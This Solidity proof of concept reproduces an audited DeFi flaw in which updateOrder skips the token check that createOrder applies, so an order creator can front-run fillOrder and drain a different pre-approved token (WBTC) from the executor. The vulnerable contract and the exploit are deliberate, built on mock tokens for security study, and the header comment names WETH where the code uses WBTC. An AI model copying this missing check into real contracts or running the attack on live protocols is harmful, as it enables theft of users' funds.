// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    INIT Capital — [H-02] Order's creator can update tokenOut to arbitrary
    token (code4rena 2024-01-init-capital-invitational, reporter said,
    finding #30258)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    MarginTradingHook.updateOrder body is inlined VERBATIM (it assigns
    order.tokenOut = _tokenOut with NO base/quote validation — marked
    "@> VULN" below); createOrder DOES enforce the base/quote check that
    updateOrder omits. The Exploit reproduces the finding's attack: creator
    opens a valid order with tokenOut = USDC (the quote asset), front-runs
    the executor's fillOrder by rewriting tokenOut to WETH (a high-value
    token the executor has pre-approved the hook to spend), then fillOrder
    pulls WETH from the executor instead of USDC.

    Root cause: createOrder validates `_tokenOut == baseAsset || _tokenOut ==
    quoteAsset`, but updateOrder never re-validates the new tokenOut — it
    blindly stores whatever address the creator supplies. fillOrder then
    transferFrom's the calculated amtOut of order.tokenOut from the
    executor. Executors commonly pre-approve the hook for many tokens so
    they can fill many orders; a single front-run rewrite steals the
    high-value approved token.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20.
contract MockToken {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced MarginTradingHook: createOrder validates tokenOut;
///         updateOrder does NOT; fillOrder pulls order.tokenOut from executor.
contract MarginTradingHookVuln {
    struct MarginPos {
        address baseAsset;
        address quoteAsset;
        address collPool; // unused in this reduction
        bool isLongBaseAsset;
    }

    struct Order {
        uint256 initPosId;
        uint256 triggerPrice_e36;
        address tokenOut;
        uint256 limitPrice_e36;
        uint256 collAmt;
        uint8 status; // 1 = Active, 3 = Filled
        address recipient;
    }

    mapping(address => mapping(uint256 => uint256)) public initPosIds;
    mapping(uint256 => MarginPos) private __marginPositions;
    mapping(uint256 => Order) private __orders;
    uint256 public lastOrderId;
    uint256 public lastInitPosId;
    // stand-in for PosManager.getCollAmt: we just track collAmt per position
    mapping(uint256 => uint256) public collAmtOf;

    function openPos(uint256 _posId, address _base, address _quote, bool _isLong)
        external
        returns (uint256 initPosId)
    {
        initPosId = ++lastInitPosId;
        initPosIds[msg.sender][_posId] = initPosId;
        __marginPositions[initPosId] =
            MarginPos({baseAsset: _base, quoteAsset: _quote, collPool: address(0), isLongBaseAsset: _isLong});
        collAmtOf[initPosId] = type(uint256).max; // unlimited coll for this reduction
    }

    /// @dev createOrder — enforces tokenOut ∈ {base, quote} (the check
    ///      updateOrder is MISSING).
    function createOrder(
        uint256 _posId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external returns (uint256 orderId) {
        require(_collAmt != 0, "ZERO_VALUE");
        uint256 initPosId = initPosIds[msg.sender][_posId];
        require(initPosId != 0, "POSITION_NOT_FOUND");
        MarginPos memory marginPos = __marginPositions[initPosId];
        // CONTROL: create-time validation that updateOrder omits
        require(_tokenOut == marginPos.baseAsset || _tokenOut == marginPos.quoteAsset, "INVALID_INPUT");
        orderId = ++lastOrderId;
        __orders[orderId] = Order({
            initPosId: initPosId,
            triggerPrice_e36: _triggerPrice_e36,
            tokenOut: _tokenOut,
            limitPrice_e36: _limitPrice_e36,
            collAmt: _collAmt,
            status: 1,
            recipient: msg.sender
        });
    }

    /// @notice VERBATIM spirit of MarginTradingHook.sol#updateOrder (L504-526).
    ///         Every check present in the real function is here; the base/quote
    ///         validation of createOrder is intentionally ABSENT.
    function updateOrder(
        uint256 _posId,
        uint256 _orderId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external {
        require(_collAmt != 0, "ZERO_VALUE");
        Order storage order = __orders[_orderId];
        require(order.status == 1, "INVALID_INPUT"); // Active
        uint256 initPosId = initPosIds[msg.sender][_posId];
        require(initPosId != 0, "POSITION_NOT_FOUND");
        MarginPos memory marginPos = __marginPositions[initPosId];
        uint256 collAmt = collAmtOf[initPosId]; // stand-in for IPosManager.getCollAmt
        require(_collAmt <= collAmt, "INPUT_TOO_HIGH");
        // @> VULN: order.tokenOut is assigned from the caller-supplied
        // `_tokenOut` with NO check that it is still baseAsset or quoteAsset.
        // createOrder enforces that invariant; updateOrder does not. A
        // malicious creator can front-run fillOrder and rewrite tokenOut to
        // any high-value token the executor has pre-approved the hook to
        // spend — fillOrder then transferFrom's that token from the executor.
        // FIX (per finding):
        //   require(_tokenOut == marginPos.baseAsset || _tokenOut == marginPos.quoteAsset, "INVALID_INPUT");
        order.triggerPrice_e36 = _triggerPrice_e36;
        order.limitPrice_e36 = _limitPrice_e36;
        order.collAmt = _collAmt;
        order.tokenOut = _tokenOut;
        marginPos; // silence unused after the missing check
    }

    /// @dev Reduced fillOrder: pulls `amtOut` of `order.tokenOut` from the
    ///      executor to the order recipient. amtOut is fixed for this PoC so
    ///      the ONLY variable that changes the stolen asset is tokenOut.
    function fillOrder(uint256 _orderId, uint256 _amtOut) external {
        Order storage order = __orders[_orderId];
        require(order.status == 1, "INVALID_INPUT");
        order.status = 3; // Filled
        // executor (msg.sender) pays order.tokenOut — whatever the creator last set
        MockToken(order.tokenOut).transferFrom(msg.sender, order.recipient, _amtOut);
    }

    function getOrder(uint256 _orderId) external view returns (Order memory) {
        return __orders[_orderId];
    }

    function getMarginPos(uint256 _initPosId) external view returns (MarginPos memory) {
        return __marginPositions[_initPosId];
    }
}

/// @notice Stands in for a real account so creator and executor each have
///         their own msg.sender without cheatcodes.
contract UserWallet {
    MarginTradingHookVuln public hook;

    constructor(MarginTradingHookVuln _hook) {
        hook = _hook;
    }

    function openPos(uint256 _posId, address _base, address _quote, bool _isLong) external returns (uint256) {
        return hook.openPos(_posId, _base, _quote, _isLong);
    }

    function createOrder(
        uint256 _posId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external returns (uint256) {
        return hook.createOrder(_posId, _triggerPrice_e36, _tokenOut, _limitPrice_e36, _collAmt);
    }

    function updateOrder(
        uint256 _posId,
        uint256 _orderId,
        uint256 _triggerPrice_e36,
        address _tokenOut,
        uint256 _limitPrice_e36,
        uint256 _collAmt
    ) external {
        hook.updateOrder(_posId, _orderId, _triggerPrice_e36, _tokenOut, _limitPrice_e36, _collAmt);
    }

    function fillOrder(uint256 _orderId, uint256 _amtOut) external {
        hook.fillOrder(_orderId, _amtOut);
    }

    function approveToken(MockToken tok, address spender, uint256 amt) external {
        tok.approve(spender, amt);
    }
}

/// @notice Creator front-runs fillOrder: rewrites tokenOut from USDC → WBTC
///         (a high-value token OUTSIDE {base, quote}); executor who
///         pre-approved many tokens loses WBTC.
contract Exploit {
    MockToken public usdc; // quote asset — the honest tokenOut
    MockToken public weth; // base asset (pair)
    MockToken public wbtc; // high-value token OUTSIDE the pair (the steal target)
    MarginTradingHookVuln public hook;
    UserWallet public creator;
    UserWallet public executor;

    uint256 public constant POS_ID = 1;
    uint256 public constant TRIGGER_E36 = 1500e18;
    uint256 public constant LIMIT_E36 = 1490e18;
    uint256 public constant COLL_AMT = 1e18;
    uint256 public constant FILL_AMT = 10e18; // amtOut the executor expects to pay (in USDC)

    uint256 public orderId;

    constructor() {
        usdc = new MockToken("USDC");
        weth = new MockToken("WETH");
        wbtc = new MockToken("WBTC");
        hook = new MarginTradingHookVuln();
        creator = new UserWallet(hook);
        executor = new UserWallet(hook);
    }

    function run() external {
        // 1. Creator opens a long-ETH / quote-USDC position and creates a
        //    VALID order with tokenOut = USDC (passes createOrder's check).
        creator.openPos(POS_ID, address(weth), address(usdc), true);
        orderId = creator.createOrder(POS_ID, TRIGGER_E36, address(usdc), LIMIT_E36, COLL_AMT);
        require(hook.getOrder(orderId).tokenOut == address(usdc), "setup: tokenOut should be USDC");

        // 2. Executor pre-approves the hook for many tokens (common practice
        //    so one bot can fill multi-token order books) and holds WBTC.
        usdc.mint(address(executor), FILL_AMT);
        wbtc.mint(address(executor), FILL_AMT);
        executor.approveToken(usdc, address(hook), type(uint256).max);
        executor.approveToken(wbtc, address(hook), type(uint256).max);

        uint256 execWbtcBefore = wbtc.balanceOf(address(executor));
        uint256 creatorWbtcBefore = wbtc.balanceOf(address(creator));

        // 3. FRONT-RUN: creator rewrites tokenOut to WBTC (high-value, NOT in
        //    {base=WETH, quote=USDC}) via the unvalidated updateOrder path —
        //    createOrder would have rejected this as INVALID_INPUT.
        creator.updateOrder(POS_ID, orderId, TRIGGER_E36, address(wbtc), LIMIT_E36, COLL_AMT);
        require(hook.getOrder(orderId).tokenOut == address(wbtc), "tokenOut not rewritten");

        // 4. Executor's fillOrder proceeds; hook pulls FILL_AMT of WBTC (not
        //    USDC) from the executor to the creator.
        executor.fillOrder(orderId, FILL_AMT);

        // HARM: executor lost FILL_AMT of high-value WBTC; creator gained it.
        // The executor expected to pay USDC (the original tokenOut).
        require(
            wbtc.balanceOf(address(executor)) == execWbtcBefore - FILL_AMT,
            "harm not demonstrated: executor WBTC not drained"
        );
        require(
            wbtc.balanceOf(address(creator)) == creatorWbtcBefore + FILL_AMT,
            "harm not demonstrated: creator did not receive WBTC"
        );
        require(usdc.balanceOf(address(executor)) == FILL_AMT, "USDC should be untouched");
    }
}
